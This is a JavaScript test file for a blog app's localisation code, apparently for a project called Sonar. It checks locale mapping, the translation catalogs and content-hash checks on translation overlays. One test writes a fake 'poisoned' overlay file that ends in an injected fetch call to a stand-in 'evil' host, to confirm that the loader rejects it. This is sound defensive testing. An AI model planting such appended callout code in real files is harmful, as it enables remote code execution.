import { test } from 'node:test';
import assert from 'node:assert/strict';
import { writeFileSync, unlinkSync, mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { spawnSync } from 'node:child_process';
import { resolveLocale, intlLocale, SUPPORTED_LOCALES } from '../src/lib/i18n/locales.js';
import { CATALOG } from '../src/lib/i18n/catalog.js';
import { localizePosts } from '../src/lib/i18n/blog.js';
import { BLOG_TRANSLATIONS } from '../src/lib/blog-translations.js';
import { blogContentHash } from '../src/lib/blog-hash.js';
import { SONAR_BLOG } from '../src/lib/blog-content.js';

test('resolveLocale maps regional tags to base locales', () => {
	assert.equal(resolveLocale(['pt-BR']), 'pt');
	assert.equal(resolveLocale(['es-MX', 'en']), 'es');
	assert.equal(resolveLocale(['ja-JP']), 'en');
	assert.equal(resolveLocale([]), 'en');
});

test('intlLocale returns BCP-47 tags', () => {
	assert.equal(intlLocale('it'), 'it-IT');
	assert.equal(intlLocale('en'), 'en-US');
});

test('every supported locale has a catalog with nav.getApp', () => {
	for (const locale of SUPPORTED_LOCALES) {
		assert.ok(CATALOG[locale], locale);
		assert.ok(CATALOG[locale]['nav.getApp'], `${locale} nav.getApp`);
	}
});

test('localizePosts overlays Italian blog title when present', () => {
	const baked = SONAR_BLOG.posts.find((p) => p.id === 'chat-control-explained');
	assert.ok(baked);
	const en = [
		{
			...baked,
			date: 'July 14, 2026',
			_ts: Math.floor(Date.UTC(2026, 6, 14) / 1000)
		}
	];
	const it = localizePosts(en, 'it');
	assert.notEqual(it[0].title, baked.title);
	assert.notEqual(it[0].date, 'July 14, 2026');
	assert.ok(BLOG_TRANSLATIONS['chat-control-explained']?.it?.md?.length > 100);
	assert.equal(localizePosts(en, 'en')[0].title, baked.title);
});

test('committed overlays carry contentHash matching English posts', () => {
	for (const post of SONAR_BLOG.posts ?? []) {
		const hash = blogContentHash(post.title, post.excerpt, post.md);
		const byLocale = BLOG_TRANSLATIONS[post.id];
		if (!byLocale) continue;
		for (const [locale, overlay] of Object.entries(byLocale)) {
			assert.equal(overlay.contentHash, hash, `${post.id}/${locale}`);
		}
	}
});

test('localizePosts ignores stale overlays whose contentHash mismatches', () => {
	const en = [
		{
			id: 'stale-post',
			title: 'New English title',
			excerpt: 'New excerpt',
			md: '# New body',
			cat: 'Policy',
			date: 'July 14, 2026',
			read: '1 min read',
			author: 'The Sonar team'
		}
	];
	const stale = {
		'stale-post': {
			it: {
				title: 'Vecchio titolo',
				excerpt: 'Vecchio excerpt',
				md: '# Vecchio',
				read: '1 min di lettura',
				contentHash: 'deadbeefdeadbeef'
			}
		}
	};
	const it = localizePosts(en, 'it', stale);
	assert.equal(it[0].title, 'New English title');
	assert.equal(it[0].md, '# New body');
});

test('translate-blog loadExisting rejects non-JSON overlays (no Function eval)', () => {
	// Poisoned file: valid prefix + JS RCE payload after a JSON object.
	const dir = mkdtempSync(join(tmpdir(), 'sonar-i18n-'));
	const poisoned = join(dir, 'blog-translations.js');
	writeFileSync(
		poisoned,
		`export const BLOG_TRANSLATIONS = {"x":{"it":{"title":"t","excerpt":"e","md":"m"}}}; fetch("http://evil")\n`,
		'utf8'
	);
	const probe = join(dir, 'probe.mjs');
	writeFileSync(
		probe,
		`
		import { readFileSync } from 'node:fs';
		const src = readFileSync(${JSON.stringify(poisoned)}, 'utf8');
		const marker = 'export const BLOG_TRANSLATIONS = ';
		const idx = src.indexOf(marker);
		const body = src.slice(idx + marker.length).replace(/;\\s*$/, '').trim();
		try {
			JSON.parse(body);
			console.log('PARSED');
		} catch {
			console.log('REJECTED');
		}
		`
	);
	const r = spawnSync(process.execPath, [probe], { encoding: 'utf8' });
	assert.equal(r.status, 0);
	assert.match(r.stdout, /REJECTED/);
	unlinkSync(poisoned);
	unlinkSync(probe);
});

test('non-English catalogs include status ping and feed keys', () => {
	for (const locale of ['it', 'de', 'es', 'pt', 'fr']) {
		assert.ok(CATALOG[locale]['status.ping.none'], `${locale} status.ping.none`);
		assert.ok(CATALOG[locale]['status.ping.ok'], `${locale} status.ping.ok`);
		assert.ok(CATALOG[locale]['status.feed.updated'], `${locale} status.feed.updated`);
		assert.ok(CATALOG[locale]['stickers.relay.connecting'], `${locale} stickers.relay.connecting`);
	}
});

test('architecture post overlays match hash when present, else English', () => {
	const baked = SONAR_BLOG.posts.find((p) => p.id === 'how-sonar-is-built');
	assert.ok(baked, 'architecture post must be baked');
	const byLocale = BLOG_TRANSLATIONS['how-sonar-is-built'];
	const it = localizePosts([baked], 'it');
	if (!byLocale) {
		// Missing overlays (PR bake without translate secret) keep English.
		assert.equal(it[0].title, baked.title);
		assert.equal(it[0].md, baked.md);
		return;
	}
	const hash = blogContentHash(baked.title, baked.excerpt, baked.md);
	for (const [locale, overlay] of Object.entries(byLocale)) {
		assert.equal(overlay.contentHash, hash, `${baked.id}/${locale}`);
	}
	// Partial bake (e.g. DE ok / IT missing) must fall back to English for IT
	// without failing the Pages job.
	if (byLocale.it) {
		assert.notEqual(it[0].title, baked.title);
	} else {
		assert.equal(it[0].title, baked.title);
		assert.equal(it[0].md, baked.md);
	}
});
